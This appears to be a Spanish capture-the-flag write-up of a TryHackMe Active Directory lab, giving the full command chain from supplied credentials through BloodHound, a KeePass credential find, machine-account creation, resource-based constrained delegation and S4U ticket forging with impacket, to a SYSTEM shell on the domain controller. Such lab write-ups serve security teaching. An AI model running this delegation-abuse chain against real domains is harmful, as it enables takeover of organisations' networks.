# Forward

Máquina de nivel intermedio de TryHackMe (Active Directory). Dominio: `ctf.local`, controlador: `DC01.ctf.local`.

Comenzamos con un conjunto de credenciales, ya que se trata de un escenario de "supuesta infracción":

- **Usuario:** `ctf.local\j.smith`
- **Contraseña:** `JSmith@IT2024`

## 1. Reconocimiento

Escaneo completo de puertos y servicios con `nmap`:

```bash
nmap -sV -sC -T4 10.65.158.131 -oN port_scan.txt
```

![[Pasted image 20261027220556.png]]

Puertos abiertos:

- **53/tcp** → Simple DNS Plus.
- **88/tcp** → Microsoft Windows Kerberos.
- **135/tcp** → MSRPC.
- **139/tcp** → NetBIOS-ssn.
- **389/tcp** → Microsoft Windows Active Directory LDAP (`Domain: ctf.local`).
- **445/tcp** → Microsoft-ds (SMB).
- **464/tcp** → kpasswd5.
- **593/tcp** → Microsoft Windows RPC over HTTP 1.0.
- **636/tcp**, **3269/tcp** → LDAP sobre SSL.
- **3268/tcp** → LDAP (Global Catalog).
- **3389/tcp** → Microsoft Terminal Services (RDP).

Datos relevantes del escaneo:

- Certificado SSL con `commonName=DC01.ctf.local`.
- RDP/NTLM: `DNS_Domain_Name: ctf.local`, `DNS_Computer_Name: DC01.ctf.local`, `Product_Version: 10.0.17763` (Windows Server 2019).
- SMB: `smb2-security-mode` 3.1.1, *message signing enabled and required* (no se puede hacer mitm relaying a smb).
- `smb-os-discovery`: host `DC01`, OS Windows.

## 2. Configuración del dominio

Añadimos el controlador de dominio al fichero de hosts para resolver `dc01.ctf.local`:

```bash
echo "10.65.158.131 dc01.ctf.local" >> /etc/hosts
```

![[Pasted image 20261027221200.png]]

## 3. Validación de credenciales con NetExec

Probamos las credenciales contra SMB y RDP:

```bash
nxc smb dc01.ctf.local -u j.smith -p 'JSmith@IT2024'
nxc rdp dc01.ctf.local -u j.smith -p 'JSmith@IT2024'
```

![[Pasted image 20261027221646.png]]

- **SMB** → autenticación válida: `ctf.local\j.smith:JSmith@IT2024` (Windows 10 / Server 2019 Build 17763 x64, SMBv1:None, Null Auth:True).
- **RDP** → `nla:False` y respuesta **`Pwn3d!`**: el usuario tiene permisos de acceso de escritorio remoto.

## 4. Acceso inicial (RDP)

Conectamos al servidor de escritorio remoto con `xfreerdp3`:

```bash
xfreerdp3 /v:10.220.10.20 /u:'j.smith' /p:'JSmith@IT2024' /cert:ignore +clipboard /dynamic-resolution
```

![[Pasted image 20261027223234.png]]

Como vemos, tenemos una conexión directa al servidor.

## 5. Enumeración del dominio con BloodHound

Con las credenciales válidas recogemos el grafo de Active Directory con BloodHound y analizamos a `J.SMITH@CTF.LOCAL`:

![[Captura de pantalla 2026-10-27 233450.png]]

`j.smith` pertenece a: `Remote Desktop Users`, `Domain Users`, `Applocker-Restricted`, `Authenticated Users`, `Everyone` y `Users`. Nada privilegiado por sí solo.

Rutas con permisos interesantes sobre `j.smith`:

![[Captura de pantalla 2026-10-27 233952.png]]

- `GenericAll` sobre `Account Operators`.
- `AddKeyCredentialLink` sobre `Key Admins` y `Enterprise Key Admins`.
- `WriteOwner` sobre `Administrators`.

Relación relevante de otro usuario con el controlador:

![[Pasted image 20261027234405.png]]

- `R.WILLIAMS@CTF.LOCAL` → **AddAllowedToAct** → `DC01.CTF.LOCAL` (posible RBCD).

Caminos totales hasta el controlador de dominio:

![[Pasted image 20261027234512.png]]

Rutas hasta `DC01.CTF.LOCAL`: `GenericAll`, `WriteOwner`, `AddKeyCredentialLink` y `AddAllowedToAct` procedentes de los grupos `Administrators`, `Key Admins` y `Enterprise Key Admins`, más el camino directo desde `R.WILLIAMS`.

## 6. Explotación

En esta fase la máquina se redespleó con la IP `10.64.132.112` (antes `10.65.158.131`), así que todos los comandos siguientes usan la nueva IP.

### 6.1. Credenciales adicionales: base de datos KeePass

Dentro de la sesión de `j.smith` nos encontramos una base de datos KeePass con la entrada **Help Desk Portal**:

![[Pasted image 20261028233544.png]]

- **Usuario:** `t.jones`
- **Contraseña:** `Helpdesk01!`
- **Notas:** *IT Help Desk ticketing system credentials*.

### 6.2. SPNs del dominio con GetUserSPNs

Enumeramos los Service Principal Names con `j.smith` y pedimos también los tickets (`--request`):

```bash
impacket-GetUserSPNs ctf.local/j.smith:'JSmith@IT2024' --request -dc-ip 10.64.132.112
```

![[Pasted image 20261029010336.png]]

- SPN `helpdesk/DC01` y `helpdesk/DC01.ctf.local` → cuenta **`svc.helpdesk`**, con delegación restringida (*constrained*) y contraseña sin cambiar desde 2026-05-20.
- `--request` devuelve además el hash `$krb5tgs$23$*svc.helpdesk$CTF.LOCAL$...` para crackeo offline (no hizo falta: seguimos por el camino de RBcd).

### 6.3. Creación de una cuenta de equipo

BloodHound marcó a `r.williams` con permiso **AddAllowedToAct** sobre `DC01`. Para aprovecharlo creamos primero una cuenta de equipo propia, usando la cuenta de `t.jones`:

```bash
impacket-addcomputer 'CTF.LOCAL/t.jones:Helpdesk01!' -dc-host dc01.ctf.local -dc-ip 10.64.132.112
```

![[Pasted image 20261029013129.png]]

Se crea la cuenta **`DESKTOP-C9W8BOBJ$`** con contraseña `BhTFnWFAxjD2VCWou342IFlzWPRq1JiQ`.

### 6.4. Resource-Based Constrained Delegation (RBcd)

Desde `r.williams` (que reutiliza la misma contraseña `Helpdesk01!`) escribimos el atributo `msDS-AllowedToActOnBehalfOfOtherIdentity` en `DC01$`, permitiendo a nuestra cuenta de equipo impersonar a cualquier usuario del controlador:

```bash
impacket-rbcd 'ctf.local/r.williams:Helpdesk01!' -dc-ip 10.64.132.112 -dc-host dc01.ctf.local -delegate-to "DC01$" -delegate-from "DESKTOP-C9W8BOBJ$" -action write
```

![[Pasted image 20261029013219.png]]

- `Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty` → no había ninguna delegación previa.
- `Delegation rights modified successfully!` → **`DESKTOP-C9W8BOBJ$ can now impersonate users on DC01$ via S4U2Proxy`**.
- Cuenta autorizada: `DESKTOP-C9W8BOBJ$` (`S-1-5-21-1966530601-3185510712-10604624-3109`).

### 6.5. Ticket de servicio como Administrator (S4U2self + S4U2Proxy)

Pedimos un ticket CIFS del controlador como si fuéramos `Administrator`:

```bash
impacket-getST -spn 'cifs/DC01.ctf.local' -impersonate 'Administrator' 'ctf.local/DESKTOP-C9W8BOBJ$:BhTFnWFAxjD2VCWou342IFlzWPRq1JiQ' -dc-ip 10.64.132.112
```

![[Pasted image 20261029013309.png]]

Impacket consigue el TGT, ejecuta `S4U2self` y `S4U2Proxy` y guarda el ticket en:

```
Administrator@cifs_DC01.ctf.local@CTF.LOCAL.ccache
```

### 6.6. Actualización de /etc/hosts

Para que Kerberos resuelva correctamente los nombres del controlador con la nueva IP, actualizamos el fichero de hosts:

![[Pasted image 20261029014438.png]]

```
10.64.132.112   DC01.ctf.local ctf.local DC01
10.64.132.112   dc01.ctf.local
```

### 6.7. Shell como SYSTEM en el controlador de dominio

Usamos el ticket guardado (`-k -no-pass` → autenticación por Kerberos, sin contraseña):

```bash
export KRB5CCNAME=Administrator@cifs_DC01.ctf.local@CTF.LOCAL.ccache
impacket-smbexec -k -no-pass ctf.local/Administrator@DC01.ctf.local
```

![[Pasted image 20261029014631.png]]

Shell semi-interactiva en `C:\Windows\system32>`.

### 6.8. Búsqueda de la flag

Listamos los usuarios del equipo y el escritorio de Administrator:

![[Pasted image 20261029014332.png]]

Usuarios en `C:\Users`: `Administrator`, `j.smith`, `Public`, `r.williams`, `r.williams.CTF`, `svc.scanner` y `t.jones`. El perfil de `Administrator` no tiene documentos, pero sí un escritorio:

![[Pasted image 20261029014306.png]]

`C:\Users\Administrator\Desktop\flag.txt` (37 bytes):

```
THM{RBCD_S4U2Proxy_T1ck3t_Th3ft_2_DA}
```

## 7. Resumen de la cadena de ataque

1. `j.smith` (credenciales dadas) → RDP + BloodHound → base de datos KeePass → `t.jones:Helpdesk01!`.
2. `t.jones` → `impacket-addcomputer` → cuenta de equipo `DESKTOP-C9W8BOBJ$`.
3. `r.williams` (misma contraseña; en BloodHound tiene **AddAllowedToAct** sobre `DC01`) → `impacket-rbcd` → delegación a `DESKTOP-C9W8BOBJ$`.
4. `impacket-getST` (S4U2self + S4U2Proxy) → ticket `cifs/DC01.ctf.local` como `Administrator`.
5. `impacket-smbexec -k -no-pass` → shell SYSTEM → **flag**.
